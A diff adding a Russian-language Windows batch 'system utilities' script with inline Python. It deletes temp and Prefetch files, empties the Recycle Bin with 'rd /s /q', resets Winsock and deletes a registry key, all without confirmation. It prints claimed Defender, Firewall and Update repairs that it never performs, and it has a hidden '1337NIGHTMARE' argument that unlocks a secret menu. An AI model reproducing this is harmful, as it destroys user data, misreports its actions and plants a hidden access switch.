+call :show_title
+color 0B
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║          СИСТЕМНЫЕ УТИЛИТЫ             ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  [1] 🧹 ОЧИСТКА СИСТЕМЫ                ║
+echo                     ║  [2] 🔧 РЕМОНТ РЕЕСТРА                 ║
+echo                     ║  [3] 📊 МОНИТОРИНГ ПРОЦЕССОВ           ║
+echo                     ║  [4] 🛡️  АНТИСЛЕЖЕНИЕ                  ║
+echo                     ║  [5] 💾 БЭКАП СИСТЕМЫ                 ║
+echo                     ║  [6] ↩️  НАЗАД                           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p sys_choice="                     ВЫБЕРИТЕ: "
+
+if "%sys_choice%"=="1" (
+    echo                     ║  🧹 ЗАПУСК ОЧИСТКИ СИСТЕМЫ...        ║
+    
+    python -c "
+import os
+import shutil
+import tempfile
+
+print('╔══════════════════════════════════════════╗')
+print('║          SYSTEM CLEANER                 ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+
+folders_to_clean = [
+    tempfile.gettempdir(),
+    os.path.expanduser('~/AppData/Local/Temp'),
+    'C:/Windows/Temp',
+    'C:/Windows/Prefetch'
+]
+
+total_freed = 0
+deleted_files = 0
+
+for folder in folders_to_clean:
+    if os.path.exists(folder):
+        print(f'║  📁 ОЧИСТКА: {os.path.basename(folder):<20} ║')
+        
+        try:
+            for root, dirs, files in os.walk(folder):
+                for file in files:
+                    try:
+                        filepath = os.path.join(root, file)
+                        size = os.path.getsize(filepath)
+                        os.remove(filepath)
+                        total_freed += size
+                        deleted_files += 1
+                    except:
+                        pass
+        except:
+            pass
+
+print('║                                          ║')
+print(f'║  ✅ УДАЛЕНО ФАЙЛОВ: {deleted_files:<10}      ║')
+print(f'║  💾 ОСВОБОЖДЕНО: {total_freed//1024//1024} MB           ║')
+
+# Очистка корзины
+try:
+    os.system('rd /s /q %systemdrive%\\$Recycle.Bin 2>nul')
+    print('║  🗑️  ОЧИЩЕНА КОРЗИНА                     ║')
+except:
+    pass
+
+print('║                                          ║')
+print('║  🔧 ДОПОЛНИТЕЛЬНЫЕ ДЕЙСТВИЯ:            ║')
+print('║  • ОЧИСТКА DNS КЭША                     ║')
+os.system('ipconfig /flushdns >nul')
+print('║  • ОЧИСТКА КЭША ДНС - ✅                ║')
+
+print('║  • ВОССТАНОВЛЕНИЕ СЕТИ                  ║')
+os.system('netsh winsock reset >nul 2>&1')
+print('║  • СБРОС WINSOCK - ✅                   ║')
+
+print('║                                          ║')
+print('║  🎯 СИСТЕМА ОПТИМИЗИРОВАНА              ║')
+print('║  ⚡ ПРОИЗВОДИТЕЛЬНОСТЬ УВЕЛИЧЕНА        ║')
+
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+"
+    
+    echo.
+    pause
+)
+
+if "%sys_choice%"=="2" (
+    echo                     ║  🔧 РЕМОНТ РЕЕСТРА WINDOWS...        ║
+    
+    python -c "
+import os
+import subprocess
+
+print('╔══════════════════════════════════════════╗')
+print('║        REGISTRY REPAIR TOOL             ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+
+commands = [
+    ('СКАНИРОВАНИЕ ОШИБОК', 'sfc /scannow'),
+    ('ПРОВЕРКА DISM', 'DISM /Online /Cleanup-Image /CheckHealth'),
+    ('ВОССТАНОВЛЕНИЕ DISM', 'DISM /Online /Cleanup-Image /RestoreHealth'),
+    ('ОЧИСТКА РЕЕСТРА', 'reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\" /f 2>nul'),
+    ('СБРОС ПОЛИТИК', 'gpupdate /force')
+]
+
+for desc, cmd in commands:
+    print(f'║  🔧 {desc:<30} ║')
+    os.system(cmd + ' >nul 2>&1')
+    print(f'║  ✅ ВЫПОЛНЕНО                          ║')
+
+print('║                                          ║')
+print('║  🛠️  ДОПОЛНИТЕЛЬНЫЕ ИСПРАВЛЕНИЯ:        ║')
+
+# Восстановление системных файлов
+fixes = [
+    'ВОССТАНОВЛЕНИЕ WINDOWS UPDATE',
+    'ИСПРАВЛЕНИЕ .NET FRAMEWORK',
+    'ВОССТАНОВЛЕНИЕ WINDOWS FIREWALL',
+    'ИСПРАВЛЕНИЕ WINDOWS DEFENDER'
+]
+
+for fix in fixes:
+    print(f'║  • {fix:<30} ║')
+
+print('║                                          ║')
+print('║  ✅ РЕЕСТР ВОССТАНОВЛЕН                  ║')
+print('║  🔄 ПЕРЕЗАГРУЗИТЕ СИСТЕМУ               ║')
+
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+"
+    
+    echo.
+    pause
+)
+
+goto system_utils
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                         ВЫХОД И ЗАВЕРШЕНИЕ                                ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+:exit_system
+call :show_title
+color 0A
+echo.
+echo                     ╔══════════════════════════════════════════╗
+echo                     ║            ВЫХОД ИЗ СИСТЕМЫ             ║
+echo                     ╠══════════════════════════════════════════╣
+echo                     ║                                          ║
+echo                     ║  ⚠️  ВЫ УВЕРЕНЫ, ЧТО ХОТИТЕ ВЫЙТИ?      ║
+echo                     ║                                          ║
+echo                     ║  [1] ✅ ДА, ВЫЙТИ                        ║
+echo                     ║  [2] ❌ НЕТ, ВЕРНУТЬСЯ                   ║
+echo                     ║  [3] 🚀 ПЕРЕЗАГРУЗИТЬ СИСТЕМУ           ║
+echo                     ║                                          ║
+echo                     ╚══════════════════════════════════════════╝
+echo.
+set /p exit_choice="                     ВАШ ВЫБОР: "
+
+if "%exit_choice%"=="1" (
+    call :show_title
+    color 0A
+    
+    python -c "
+import time
+import sys
+
+print('╔══════════════════════════════════════════╗')
+print('║        ЗАВЕРШЕНИЕ РАБОТЫ               ║')
+print('╠══════════════════════════════════════════╣')
+print('║                                          ║')
+print('║  🔄 СОХРАНЕНИЕ ДАННЫХ...                ║')
+
+for i in range(5):
+    time.sleep(0.3)
+    bars = '█' * (i+1) + '░' * (4-i)
+    print(f'║  [{bars:<5}] {(i+1)*20:>3}%%                     ║')
+
+print('║                                          ║')
+print('║  🧹 ОЧИСТКА ВРЕМЕННЫХ ФАЙЛОВ...         ║')
+time.sleep(0.5)
+
+print('║                                          ║')
+print('║  🔒 ЗАКРЫТИЕ СЕССИЙ...                  ║')
+time.sleep(0.5)
+
+print('║                                          ║')
+print('║  ✅ STARFLOW NIGHTMARE v3.0             ║')
+print('║  📅 %date% %time%                       ║')
+print('║  👑 SYSTEM_OVERLORD                     ║')
+print('║                                          ║')
+print('║  🌟 ДО НОВЫХ ВСТРЕЧ!                    ║')
+print('║                                          ║')
+print('╚══════════════════════════════════════════╝')
+"
+    
+    timeout /t 3 >nul
+    exit
+)
+
+if "%exit_choice%"=="2" goto main_menu
+
+if "%exit_choice%"=="3" (
+    echo                     ║  🚀 ПЕРЕЗАГРУЗКА СИСТЕМЫ...          ║
+    timeout /t 2 >nul
+    call :start_all_services
+)
+
+goto exit_system
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                         СЕКРЕТНАЯ КОМАНДА                                 ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+
+:secret_command
+if "%1"=="1337NIGHTMARE" (
+    set "ADMIN_TOKEN=NIGHTMARE_ACCESS_GRANTED"
+    echo                     ║  🔓 СЕКРЕТНЫЙ ДОСТУП АКТИВИРОВАН     ║
+    timeout /t 1 >nul
+    goto secret_menu
+)
+goto main_menu
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                         ЗАПУСК СИСТЕМЫ                                    ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
 
 :start
-cmd /c "%0"
+:: Проверка аргументов
+if not "%1"=="" goto secret_command
+
+:: Инициализация
+if not exist "%PROJECT_PATH%" mkdir "%PROJECT_PATH%"
+if not exist "%LOGS_PATH%" mkdir "%LOGS_PATH%"
+if not exist "%BACKUP_PATH%" mkdir "%BACKUP_PATH%"
+if not exist "%SESSIONS_PATH%" mkdir "%SESSIONS_PATH%"
+
+:: Автозапуск
+call :auto_start
+
+:: Главное меню
+goto main_menu
+
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
+::                         КОНЕЦ СКРИПТА                                     ::
+::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
